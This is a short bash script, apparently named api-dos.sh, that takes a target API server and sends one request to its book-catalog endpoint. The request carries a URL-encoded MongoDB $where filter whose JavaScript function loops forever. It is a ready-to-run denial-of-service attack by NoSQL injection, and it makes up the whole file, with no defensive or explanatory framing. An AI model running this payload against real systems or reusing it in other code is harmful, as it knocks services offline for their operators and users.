#!/bin/bash
if [ $1 ]; then
  api_backend=$1
  curl --request GET \
  --url $api_backend':/api/full_book_catalogs?filter=%7B%22where%22%3A%7B%22%24where%22%3A+%22function%28%29%7Bwhile%281%29%3Bconst+msg%3Dthis.id%3Bprint%28this.title%29%3Bprint%28ISODate%28%29%29%3B%7D%22%7D%7D' \
  --header 'Content-Type: application/json' 
else
  echo "usage: api-dos.sh <target-api-server>"
  echo "Please API Backend Address "
fi
